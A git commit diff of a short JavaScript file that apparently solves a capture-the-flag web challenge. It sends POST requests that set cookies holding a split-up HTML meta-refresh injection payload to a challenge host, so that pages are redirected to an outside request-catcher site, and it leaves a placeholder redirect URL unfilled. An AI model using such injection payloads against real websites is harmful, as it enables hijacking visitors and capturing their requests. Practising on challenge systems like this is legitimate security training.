18fb4583b654ef6d40813d7905cb7755b2a4178b
Amazingrupak <rupak@Rupak.>
2024-06-27 18:59:29 +0530

    Initial commit

--- hi.js
+++ hi.js
@@ -10,40 +10,38 @@ async function makePostRequest(url, data) {
     return await response.json();
 }
 
-// Define meta cookies parts
-const metaCookiesParts = [
-    'a=<meta ',
-    ' http-equiv="refresh" ',
-    ' content="0; ',
-    ' url=https://hi.requestcatcher.com/">'
-];
+// Function to set cookies and redirect
+async function setCookiesAndRedirect() {
+    const metaCookiesParts = [
+        'a=<meta ',
+        ' http-equiv="refresh" ',
+        ' content="0; ',
+        ' url=https://hi.requestcatcher.com/">'
+    ];
 
-const url = 'http://host3.metaproblems.com:6020/index.php';
+    const url = 'http://host3.metaproblems.com:6020/index.php';
+    const numRequests = 4;
+    const requests = [];
 
-// Number of requests to make
-const numRequests = 4;
+    // Loop to create requests
+    for (let i = 0; i < numRequests; i++) {
+        const data = {
+            cookie_name: `cookie_${i + 1}`,
+            cookie_value: metaCookiesParts.join('')
+        };
+        requests.push(makePostRequest(url, data));
+    }
 
-// Array to hold all POST requests
-const requests = [];
-
-// Loop to create requests
-for (let i = 0; i < numRequests; i++) {
-    const data = {
-        cookie_name: `cookie_${i + 1}`,
-        cookie_value: metaCookiesParts.join('')
-    };
-    requests.push(makePostRequest(url, data));
-}
-
-// Perform all requests concurrently using Promise.all
-Promise.all(requests)
-    .then(responses => {
+    try {
+        // Perform all requests concurrently using Promise.all
+        const responses = await Promise.all(requests);
         responses.forEach((response, index) => {
             console.log(`Cookie ${index + 1} set: ${response}`);
         });
+
         // Redirect to view cookie URL after setting cookies (assuming all requests succeeded)
         window.location.href = 'view_cookie_url'; // Replace with actual URL
-    })
-    .catch(error => {
+    } catch (error) {
         console.error('Error setting cookies:', error);
-    });
+    }
+}
